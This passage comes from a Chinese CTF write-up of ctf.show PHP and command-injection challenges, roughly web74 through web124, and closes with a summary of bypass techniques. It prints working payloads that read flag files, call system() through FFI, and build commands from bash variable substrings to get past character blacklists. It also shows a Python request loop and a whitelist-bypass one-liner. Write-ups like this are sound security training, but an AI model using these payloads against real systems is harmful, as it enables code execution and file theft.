var\r\n\r\n\r\nc=require("/flagc.txt");exit();\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web74",children:"web74"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'c=$a=new DirectoryIterator(\'glob:///*\');foreach($a as $f){echo($f->__toString()." ");}exit();\r\n\r\nbin dev etc flagx.txt home lib media mnt opt proc root run sbin srv sys tmp usr var\r\n    \r\n    \r\nc=require("/flagx.txt");exit();\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web75",children:"***web75"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'c=$a=new DirectoryIterator(\'glob:///*\');foreach($a as $f){echo($f->__toString()." ");}exit();\r\n\r\nbin dev etc flag36.txt home lib media mnt opt proc root run sbin srv sys tmp usr var\r\n\r\n\r\nc=require("/flag36.txt");exit();\r\n\r\n\u597d \u62a5\u9519\u4e86\uff0c\u770b\u6765\u4e0d\u80fd\u7528require\u4e86\uff0c\u6211\u53bb\u8bd5\u8bd5include\u3002\r\n\u597d \u8fd8\u662f\u4e0d\u80fd\n'})}),"\n",(0,l.jsx)(n.p,{children:"\u770b\u4e86\u5357\u795e\u535a\u5ba2\uff0c\u597dmysql\u62ffflag\u770b\u4e0d\u61c2\uff0c\u722c,\u62ff\u4e2apayload\u5c31\u722c"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',\r\n'root');foreach($dbh->query('select load_file(\"/flag36.txt\")') as $row)\r\n{echo($row[0]).\"|\"; }$dbh = null;}catch (PDOException $e) {echo $e-\r\n>getMessage();exit(0);}exit(0);\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web76",children:"web76"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString().\" \");}exit();\r\n\r\nbin dev etc flag36d.txt home lib media mnt opt proc root run sbin srv sys tmp usr var\r\n\r\nc=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',\r\n'root');foreach($dbh->query('select load_file(\"/flag36d.txt\")') as $row)\r\n{echo($row[0]).\"|\"; }$dbh = null;}catch (PDOException $e) {echo $e-\r\n>getMessage();exit(0);}exit(0);\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web77",children:"***web77"}),"\n",(0,l.jsx)(n.p,{children:"php7.4\r\n\u5148\u548c\u4e4b\u524d\u4e00\u6837\u8bfb\u53d6\u76ee\u5f55"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString().\" \");};exit();\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u53d1\u73b0flag\u662fflag36x.txt\uff0c\u8fd8\u6709\u4e2areadflag\r\n\u7136\u540e\u770b\u7fa4\u4e3b\u7684hint\r\nFFI\uff0cphp7.4\u4ee5\u4e0a\u624d\u6709 ",(0,l.jsx)(n.a,{href:"https://www.php.net/manual/zh/ffi.cdef.php",children:"https://www.php.net/manual/zh/ffi.cdef.php"})," ",(0,l.jsx)(n.a,{href:"https://www.php.cn/php-weizijiaocheng-415807.html",children:"https://www.php.cn/php-weizijiaocheng-415807.html"}),"\r\n\u8fd9\u91cc\u56e0\u4e3a\u4e0d\u80fd\u56de\u663e\uff0c\u6240\u4ee5\u5229\u7528\u91cd\u5b9a\u5411\u5c06readflag\u5185\u5bb9\u8f93\u51fa\u5230\u5176\u4ed6\u5730\u65b9"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:'c=?><?php $ffi = FFI::cdef("int system(const char *command);");$ffi->system("/readflag >flag.txt");exit();\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web118",children:"web118"}),"\n",(0,l.jsx)(n.p,{children:"\u6e90\u4ee3\u7801\u770b\u5230system($code);\u4f46\u662f\u8f93\u5165ls\u4ed6\u76f4\u63a5\u62e6\u4e0b\u6765\u4e86"}),"\n",(0,l.jsx)(n.p,{children:"\u4e8e\u662f\u5199\u4e2a\u811a\u672cfuzz\u4e00\u4e0b"}),"\n",(0,l.jsxs)(n.p,{children:["\u53d1\u73b0",(0,l.jsx)(n.code,{children:"ABCDEFGHIJKLMNOPQRSTUVWXYZ#$.:;?@_{}~"}),"\u90fd\u53ef\u7528\uff0c\u5176\u4ed6\u4e0d\u53ef\u7528"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"!preg_match('/\\x09|\\x0a|[a-z]|[0-9]|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\<|\\>|\\'|\\\"|\\`|\\||\\,/'\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u4e8e\u662f\u4f7f\u7528bash\u5185\u7f6e\u53d8\u91cf\u6765\u5229\u7528"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{alt:"image-20220126161805743",src:r(14683).A+"",width:"367",height:"300"})}),"\n",(0,l.jsx)(n.p,{children:"\u9996\u5148\u786e\u5b9a\u8981\u4f7f\u7528\u7684\u547d\u4ee4\uff0c\u6709\uff1acat\u3001tac\u3001more\u3001less\u3001head\u3001tail\u3001nl\u3001sed\u3001sort\u3001uniq\u3001rev"}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\u60f3\u529e\u6cd5\u6784\u9020\uff0c\u53ef\u4ee5\u770b\u5230\u5b57\u6bcd\u548c0\u7684\u4f5c\u7528\u662f\u76f8\u540c\u7684"}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u91cc\u7b2c\u4e00\u60f3\u6cd5\u80af\u5b9a\u662f\u6784\u9020\u6700\u77ed\u7684nl"}),"\n",(0,l.jsx)(n.p,{children:"\u4f46\u662f\u9776\u673a\u4e0d\u7ed9\u6211\u56de\u663e\uff0c\u770b\u4e0d\u51fa\u4ed6\u548c\u6211\u672c\u5730\u5230\u5e95\u4e00\u4e0d\u4e00\u6837"}),"\n",(0,l.jsx)(n.p,{children:"\u6700\u540e\u8fd8\u662f\u53bb\u770b\u5357\u795e\u535a\u5ba2\u53bb\u4e86"}),"\n",(0,l.jsx)(n.p,{children:"PATH\u56de\u663e/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\u56e0\u4e3a\u4e00\u822c\u9898\u76ee\u90fd\u5728/var/www/html\u4e0b"}),"\n",(0,l.jsx)(n.p,{children:"\u4e8e\u662f\u5c31\u5f97\u5230\u4e86nl\uff0c\u518d\u7528????.???\u53bb\u5339\u914d\u5230flag.php"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"${PATH:~A}${PWD:~A} ????.???\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\u67e5\u770b\u6e90\u4ee3\u7801\u5373\u53ef"}),"\n",(0,l.jsx)(n.h3,{id:"web119",children:"web119"}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u4e4b\u524d\u7684\u57fa\u7840\u4e0aban\u6389\u4e86PATH\u3001BASH"}),"\n",(0,l.jsx)(n.p,{children:"\u53ef\u60dc\u4e86\uff0c\u672c\u6765PATH\u8fc7\u6ee4\u6389\u4e86\u4e4b\u540e\u60f3\u6784\u9020head\uff0c\u56e0\u4e3a\u5df2\u7ecf\u80fd\u62ff\u5230he\uff0c\u4f46\u662fBASH\u53c8\u88ab\u8fc7\u6ee4\u5c31\u6ca1\u529e\u6cd5\u4e86\uff0c\u6700\u540e\u8fd8\u662f\u53bb\u7528\u4e86hint\u91cc\u9762\u7684payload"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"${HOME:${#HOSTNAME}:${#SHLVL}}     ====>   t\r\n\r\n${PWD:${Z}:${#SHLVL}}    ====>   /\r\n\r\n/bin/cat flag.php\r\n\r\n${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web120",children:"web120"}),"\n",(0,l.jsx)(n.p,{children:"\u7ec8\u4e8e\u767d\u540d\u5355\u4e86"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"<?php\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\nif(isset($_POST['code'])){\r\n    $code=$_POST['code'];\r\n    if(!preg_match('/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\<|\\>|\\'|\\\"|\\`|\\||\\,/', $code)){    \r\n        if(strlen($code)>65){\r\n            echo '<div align=\"center\">'.'you are so long , I dont like '.'</div>';\r\n        }\r\n        else{\r\n        echo '<div align=\"center\">'.system($code).'</div>';\r\n        }\r\n    }\r\n    else{\r\n     echo '<div align=\"center\">evil input</div>';\r\n    }\r\n}\r\n\r\n?>\r\n\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u91cc\u5c31\u60f3\u529e\u6cd5\u7528\u4e0a\u9762\u7684payload\u6765\u53d8\u5f62\uff0c\u9996\u5148\u5c31\u662f\u80fd\u7528?\u7684\u5c31\u7528?"}),"\n",(0,l.jsxs)(n.p,{children:["\u80fd\u53d1\u73b0\u4e0a\u4e00\u4e2apayload\u7684",(0,l.jsx)(n.code,{children:"${HOME:${#HOSTNAME}:${#SHLVL}}"}),"\u7279\u522b\u5360\u4f4d\u7f6e\uff0c\u4e8e\u662f\u60f3\u5230\u627e\u5176\u4ed6\u5b57\u6bcd"]}),"\n",(0,l.jsx)(n.p,{children:"\u7531\u4e8e\u662f\u9776\u573a\u73af\u5883\uff0c\u4e00\u822c\u7ed9\u7684\u6743\u9650\u90fd\u662fwww-data\uff0c\u8fd9\u91cc\u5c31\u53ef\u4ee5\u5229\u7528?a?\u6765\u6307\u4ee3cat"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"${PWD::${#SHLVL}}???${PWD:${#}:${#SHLVL}}?${USER:~A}? ????.???\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\u67e5\u770b\u6e90\u4ee3\u7801"}),"\n",(0,l.jsx)(n.h3,{id:"web121",children:"web121"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"\r\n<?php\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\nif(isset($_POST['code'])){\r\n    $code=$_POST['code'];\r\n    if(!preg_match('/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|\\%|\\<|\\>|\\'|\\\"|\\`|\\||\\,/', $code)){    \r\n        if(strlen($code)>65){\r\n            echo '<div align=\"center\">'.'you are so long , I dont like '.'</div>';\r\n        }\r\n        else{\r\n        echo '<div align=\"center\">'.system($code).'</div>';\r\n        }\r\n    }\r\n    else{\r\n     echo '<div align=\"center\">evil input</div>';\r\n    }\r\n}\r\n\r\n?>\r\n\r\n\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u91cc\u53ef\u4ee5\u6784\u9020/bin/bash64\u6765\u8f93\u51fa\uff0c\u800cRANDOM\u7684\u8f93\u51fa\u5728\u6211\u9776\u673a\u4e0a\u4e00\u822c\u4e3a4\u548c5\uff0c\u5f88\u5c11\u7684\u65f6\u5019\u662f3"}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.code,{children:"${PWD::${##}}"}),"\u8f93\u51fa/   ",(0,l.jsx)(n.code,{children:"${RANDOM}"}),"\u8f93\u51fa\u968f\u673a\u6570  ",(0,l.jsx)(n.code,{children:"${#RANDOM}"}),"\u8f93\u51fa\u968f\u673a\u6570\u5b57\u7684\u957f\u5ea6\uff0c\u6240\u4ee5\u52a0\u4e0a#\u5c31\u662f\u8f93\u51fa\u4ed6\u8f93\u51fa\u5185\u5bb9\u7684\u957f\u5ea6"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"code=${PWD:${#}:${##}}???${PWD:${#}:${##}}?????${#RANDOM} ????.???\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web122",children:"web122"}),"\n",(0,l.jsx)(n.p,{children:"\u8fc7\u6ee4\u4e86PWD\u3001#\uff0c\u767d\u540d\u5355\u4e86HOME"}),"\n",(0,l.jsxs)(n.p,{children:["\u67e5\u770b\u4e00\u4e0bhint ",(0,l.jsx)(n.code,{children:"$?"}),"  ",(0,l.jsx)(n.code,{children:"$?\u662f\u8868\u793a\u4e0a\u4e00\u6761\u547d\u4ee4\u6267\u884c\u7ed3\u675f\u540e\u7684\u4f20\u56de\u503c\u3002\u901a\u5e380\u4ee3\u8868\u6267\u884c\u6210\u529f\uff0c\u975e0\u4ee3\u8868\u6267\u884c\u6709\u8bef"})]}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u91cccopy\u4e00\u4e0b\u5357\u795e\u627e\u7684\u8d44\u6599"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-shell",children:'"OS error code   1:  Operation not permitted"\r\n"OS error code   2:  No such file or directory"\r\n"OS error code   3:  No such process"\r\n"OS error code   4:  Interrupted system call"\r\n"OS error code   5:  Input/output error"\r\n"OS error code   6:  No such device or address"\r\n"OS error code   7:  Argument list too long"\r\n"OS error code   8:  Exec format error"\r\n"OS error code   9:  Bad file descriptor"\r\n"OS error code  10:  No child processes"\n'})}),"\n",(0,l.jsx)(n.p,{children:"\u5229\u7528<A\u6784\u9020\u6570\u5b571,\u7136\u540e\u770b\u8fd0\u884c\u8dd1\u51fa\u6570\u5b574"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"code=<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???\n"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-python",children:"import requests\r\nurl = 'http://5186025a-cc19-4b5b-bd65-1258825fc3dc.challenge.ctf.show/'\r\ndata = {'code':'<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???'}\r\nwhile True:\r\n    r = requests.post(url=url,data=data).text\r\n    if('PD9w' in r):\r\n        print(r)\r\n        exit()\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web124",children:"web124"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:" <?php\r\n\r\n/*\r\n# -*- coding: utf-8 -*-\r\n# @Author: \u6536\u96c6\u81ea\u7f51\u7edc\r\n# @Date:   2020-09-16 11:25:09\r\n# @Last Modified by:   h1xa\r\n# @Last Modified time: 2020-10-06 14:04:45\r\n\r\n*/\r\n\r\nerror_reporting(0);\r\n//\u542c\u8bf4\u4f60\u5f88\u559c\u6b22\u6570\u5b66\uff0c\u4e0d\u77e5\u9053\u4f60\u662f\u5426\u7231\u5b83\u80dc\u8fc7\u7231flag\r\nif(!isset($_GET['c'])){\r\n    show_source(__FILE__);\r\n}else{\r\n    //\u4f8b\u5b50 c=20-1\r\n    $content = $_GET['c'];\r\n    if (strlen($content) >= 80) {\r\n        die(\"\u592a\u957f\u4e86\u4e0d\u4f1a\u7b97\");\r\n    }\r\n    $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]'];\r\n    foreach ($blacklist as $blackitem) {\r\n        if (preg_match('/' . $blackitem . '/m', $content)) {\r\n            die(\"\u8bf7\u4e0d\u8981\u8f93\u5165\u5947\u5947\u602a\u602a\u7684\u5b57\u7b26\");\r\n        }\r\n    }\r\n    //\u5e38\u7528\u6570\u5b66\u51fd\u6570http://www.w3school.com.cn/php/php_ref_math.asp\r\n    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\r\n    preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs);  \r\n    foreach ($used_funcs[0] as $func) {\r\n        if (!in_array($func, $whitelist)) {\r\n            die(\"\u8bf7\u4e0d\u8981\u8f93\u5165\u5947\u5947\u602a\u602a\u7684\u51fd\u6570\");\r\n        }\r\n    }\r\n    //\u5e2e\u4f60\u7b97\u51fa\u7b54\u6848\r\n    eval('echo '.$content.';');\r\n} \n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u91cc\u60f3\u529e\u6cd5\u6784\u9020system('xxx')\u6765\u6267\u884c\u4efb\u610f\u547d\u4ee4"}),"\n",(0,l.jsxs)(n.p,{children:["\u53ef\u4ee5\u5411\u529e\u6cd5\u6784\u9020",(0,l.jsx)(n.code,{children:"$_GET[a]($_GET[b])"}),"\uff0c\u8fd9\u6837\u4f20\u5165a=system&b=ls\u5c31\u80fd\u591f\u6267\u884c\u547d\u4ee4\u4e86"]}),"\n",(0,l.jsx)(n.p,{children:"payload"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-payload",children:"c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{sin}($$pi{cos})&sin=system&cos=tac flag.php\n"})}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsxs)(n.p,{children:["\u5728\u7ebf\u8fdb\u5236\u8f6c\u6362\uff1a",(0,l.jsx)(n.a,{href:"https://tool.lu/hexconvert/",children:"https://tool.lu/hexconvert/"})]}),"\n",(0,l.jsx)(n.p,{children:"hex2bin\u768410\u8fdb\u5236\u4e3a37907361743"}),"\n",(0,l.jsx)(n.p,{children:"dechex\u7684\u4f5c\u7528\u662f\u5341\u8fdb\u5236\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236"}),"\n",(0,l.jsx)(n.p,{children:"_GET\u8f6c16\u8fdb\u5236\u518d\u8f6c10\u8fdb\u5236\u7684\u503c\u4e3a1598506324"}),"\n",(0,l.jsx)(n.p,{children:"hex2bin\u628a\u5341\u516d\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3aASCII\u7801"}),"\n",(0,l.jsx)(n.p,{children:"\u7528pi\u5f53\u53d8\u91cf\u7684\u539f\u56e0\u662fpi\u5728\u767d\u540d\u5355\u4e2d\uff0c\u53d8\u91cf\u540d\u53ea\u8981\u5728\u767d\u540d\u5355\u4e2d\u90fd\u53ef\u4ee5\uff0c\u540e\u9762\u7684sin\u548ccos\u4e5f\u662f\u4e00\u6837\u7684"}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"\u77e5\u8bc6\u70b9\u603b\u7ed3",children:"\u77e5\u8bc6\u70b9\u603b\u7ed3"}),"\n",(0,l.jsx)(n.p,{children:"1.linux\u77e5\u8bc6\uff1a\u901a\u914d\u7b26"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"\u5339\u914d\u4efb\u4f55\u5b57\u7b26\u4e32\uff0f\u6587\u672c\uff0c\u5305\u62ec\u7a7a\u5b57\u7b26\u4e32\uff1b*\u4ee3\u8868\u4efb\u610f\u5b57\u7b26\uff080\u4e2a\u6216\u591a\u4e2a\uff09 ls file *\r\n?\t\u5339\u914d\u4efb\u4f55\u4e00\u4e2a\u5b57\u7b26\uff08\u4e0d\u5728\u62ec\u53f7\u5185\u65f6\uff09?\u4ee3\u8868\u4efb\u610f1\u4e2a\u5b57\u7b26 ls file 0\r\n[abcd]\t\u5339\u914dabcd\u4e2d\u4efb\u4f55\u4e00\u4e2a\u5b57\u7b26\r\n[a-z]\t\u8868\u793a\u8303\u56f4a\u5230z\uff0c\u8868\u793a\u8303\u56f4\u7684\u610f\u601d []\u5339\u914d\u4e2d\u62ec\u53f7\u4e2d\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26 ls file 0"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:"\u5bf9\u4e8elinux cat\u548cca''t ca\\t ca\"\"t\u6548\u679c\u662f\u76f8\u540c\u7684 \u8fd9\u6837\u540c\u6837\u53ef\u4ee5\u7ed5\u8fc7\u5b57\u7b26\u7684\u9650\u5236"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:"2.\u540csystem\u7684\u547d\u4ee4\u6267\u884c\u51fd\u6570"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"system : \u6267\u884c\u5916\u90e8\u7a0b\u5e8f\uff0c\u5e76\u4e14\u663e\u793a\u8f93\u51fa\uff0c\u5982\u679c PHP \u8fd0\u884c\u5728\u670d\u52a1\u5668\u6a21\u5757\u4e2d\uff0c system() \u51fd\u6570\u8fd8\u4f1a\u5c1d\u8bd5\u5728\u6bcf\u884c\u8f93\u51fa\u5b8c\u6bd5\u4e4b\u540e\uff0c \u81ea\u52a8\u5237\u65b0 web \u670d\u52a1\u5668\u7684\u8f93\u51fa\u7f13\u5b58\u3002\u5982\u679c\u8981\u83b7\u53d6\u4e00\u4e2a\u547d\u4ee4\u672a\u7ecf\u4efb\u4f55\u5904\u7406\u7684 \u539f\u59cb\u8f93\u51fa\uff0c \u8bf7\u4f7f\u7528 passthru() \u51fd\u6570\u3002\r\nexec \uff1a \u6267\u884c\u4e00\u4e2a\u5916\u90e8\u7a0b\u5e8f,\u56de\u663e\u6700\u540e\u4e00\u884c,\u9700\u8981\u7528echo\u8f93\u51fa\u3002\r\nshell_exec \uff1a \u901a\u8fc7 shell \u73af\u5883\u6267\u884c\u547d\u4ee4\uff0c\u5e76\u4e14\u5c06\u5b8c\u6574\u7684\u8f93\u51fa\u4ee5\u5b57\u7b26\u4e32\u7684\u65b9\u5f0f\u8fd4\u56de\u3002\r\npopen \uff1a \u6253\u5f00\u4e00\u4e2a\u6307\u5411\u8fdb\u7a0b\u7684\u7ba1\u9053\uff0c\u8be5\u8fdb\u7a0b\u7531\u6d3e\u751f\u7ed9\u5b9a\u7684 command \u547d\u4ee4\u6267\u884c\u800c\u4ea7\u751f\u3002\r\nproc_open \uff1a \u6267\u884c\u4e00\u4e2a\u547d\u4ee4\uff0c\u5e76\u4e14\u6253\u5f00\u7528\u6765\u8f93\u5165/\u8f93\u51fa\u7684\u6587\u4ef6\u6307\u9488\u3002\r\npassthru \uff1a \u6267\u884c\u5916\u90e8\u7a0b\u5e8f\u5e76\u4e14\u663e\u793a\u539f\u59cb\u8f93\u51fa\u3002\u540c exec() \u51fd\u6570\u7c7b\u4f3c\uff0c passthru() \u51fd\u6570 \u4e5f\u662f\u7528\u6765\u6267\u884c\u5916\u90e8\u547d\u4ee4\uff08command\uff09\u7684\u3002 \u5f53\u6240\u6267\u884c\u7684 Unix \u547d\u4ee4\u8f93\u51fa\u4e8c\u8fdb\u5236\u6570\u636e\uff0c \u5e76\u4e14\u9700\u8981\u76f4\u63a5\u4f20\u9001\u5230\u6d4f\u89c8\u5668\u7684\u65f6\u5019\uff0c \u9700\u8981\u7528\u6b64\u51fd\u6570\u6765\u66ff\u4ee3 exec() \u6216 system() \u51fd\u6570\u3002 \u5e38\u7528\u6765\u6267\u884c\u8bf8\u5982 pbmplus \u4e4b\u7c7b\u7684\u53ef\u4ee5\u76f4\u63a5\u8f93\u51fa\u56fe\u50cf\u6d41\u7684\u547d\u4ee4\u3002 \u901a\u8fc7\u8bbe\u7f6e Content-type \u4e3a image/gif\uff0c \u7136\u540e\u8c03\u7528 pbmplus \u7a0b\u5e8f\u8f93\u51fa gif \u6587\u4ef6\uff0c \u5c31\u53ef\u4ee5\u4ece PHP \u811a\u672c\u4e2d\u76f4\u63a5\u8f93\u51fa\u56fe\u50cf\u5230\u6d4f\u89c8\u5668\u3002\r\npcntl_exec() \uff1a \u5728\u5f53\u524d\u8fdb\u7a0b\u7a7a\u95f4\u6267\u884c\u6307\u5b9a\u7a0b\u5e8f\uff0c\u5f53\u53d1\u751f\u9519\u8bef\u65f6\u8fd4\u56de false \uff0c\u6ca1\u6709\u9519\u8bef\u65f6\u6ca1\u6709\u8fd4\u56de\u3002 \r\n`\uff08\u53cd\u5f15\u53f7\uff09\uff1a\u540c shell_exec() \n"})}),"\n",(0,l.jsx)(n.p,{children:"3.\u7a7a\u683c\u7ed5\u8fc7"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:"${IFS} \u4f46\u4e0d\u80fd\u5199\u4f5c $IFS\r\n$IFS$9\r\n%09\r\n<>\r\n<\r\n$IFS%09"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:"4.\u540ccat\u7528\u6cd5\u7684\u51fd\u6570"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:"cat\u3001tac\u3001more\u3001less\u3001head\u3001tail\u3001nl\u3001sed\u3001sort\u3001uniq\u3001rev"}),"\n"]}),"\n",(0,l.jsx)(n.p,{children:"5.\u4f2a\u534f\u8bae"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"\u603b\uff1a\r\nfile:// \u534f\u8bae\r\nphp:// \u534f\u8bae\r\nzip:// bzip2:// zlib:// \u534f\u8bae\r\ndata:// \u534f\u8bae\r\nhttp:// \u534f\u8bae https://\u534f\u8bae\r\nphar:// \u534f\u8bae\r\n\r\n\u5206\uff1a\r\nfile:// \u534f\u8bae\uff1a\r\n\t\t\u6761\u4ef6 allow_url_fopen:off/on  allow_url_include :off/on\r\n\t\t\u4f5c\u7528\uff1a\u7528\u4e8e\u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u3002\u5728include()/require()\u7b49\u53c2\u6570\u53ef\u63a7\u7684\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u5bfc\u5165\u975ephp\u6587\u4ef6\u4e5f\u4f1a\u88ab\u89e3\u6790\u4e3aphp\r\n\t\t\u7528\u6cd5\uff1a1.file://[\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84\u548c\u6587\u4ef6\u540d]\r\n\t \t\t2.[\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84\u548c\u6587\u4ef6\u540d]\r\n\t \t\t3.[http\uff1a//\u7f51\u7edc\u8def\u5f84\u548c\u6587\u4ef6\u540d]\r\n\r\nphp:// \u534f\u8bae\uff1a\u6761\u4ef6 allow_url_include :\u4ec5php://input php://stdin php://memory php://temp \u9700\u8981on allow_url_fopen:off/on\r\n\t\t\u4f5c\u7528\uff1aphp:// \u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O streams\uff09\uff0c\u5728CTF\u4e2d\u7ecf\u5e38\u4f7f\u7528\u7684\u662fphp://filter\u548cphp://input\uff0cphp://filter\u7528\u4e8e\u8bfb\u53d6\u6e90\u7801\uff0cphp://input\u7528\u4e8e\u6267\u884cphp\u4ee3\u7801\r\n\t\tphp://filter\u53c2\u6570\u8be6\u89e3\uff1aresource=\uff08\u5fc5\u9009\uff0c\u6307\u5b9a\u4e86\u4f60\u8981\u7b5b\u9009\u8fc7\u6ee4\u7684\u6570\u636e\u6d41\uff09     read=\uff08\u53ef\u9009\uff09    write=\uff08\u53ef\u9009\uff09\r\n\t\t\u5bf9read\u548cwrite\uff0c\u53ef\u9009\u8fc7\u6ee4\u5668\u6709string.rot13\u3001string.toupper\u3001string.tolower\u3001string.strip_tags\u3001convert.base64-encode & convert.base64-decode\r\n         \u7528\u6cd5\u4e3e\u4f8b\uff1aphp://filter/read=convert.base64-encode/resource=flag.php\r\n\r\nzip:// bzip2:// zlib:// \u534f\u8bae\uff1a\r\n        \u6761\u4ef6\uff1aallow_url_fopen:off/on      allow_url_include :off/on\r\n        \u4f5c\u7528\uff1azip:// & bzip2:// & zlib:// \u5747\u5c5e\u4e8e\u538b\u7f29\u6d41\uff0c\u53ef\u4ee5\u8bbf\u95ee\u538b\u7f29\u6587\u4ef6\u4e2d\u7684\u5b50\u6587\u4ef6\uff0c\u66f4\u91cd\u8981\u7684\u662f\u4e0d\u9700\u8981\u6307\u5b9a\u540e\u7f00\u540d\r\n        \u7528\u6cd5\uff1azip://[\u538b\u7f29\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84]%23[\u538b\u7f29\u6587\u4ef6\u5185\u7684\u5b50\u6587\u4ef6\u540d]\r\n        \t compress.bzip2://file.bz2\r\n        \t compress.zlib://file.gz\r\n        \u5176\u4e2dphar://\u548czip://\u7c7b\u4f3c\r\n\r\ndata:// \u534f\u8bae\uff1a\r\n        \u6761\u4ef6\uff1aallow_url_fopen:on    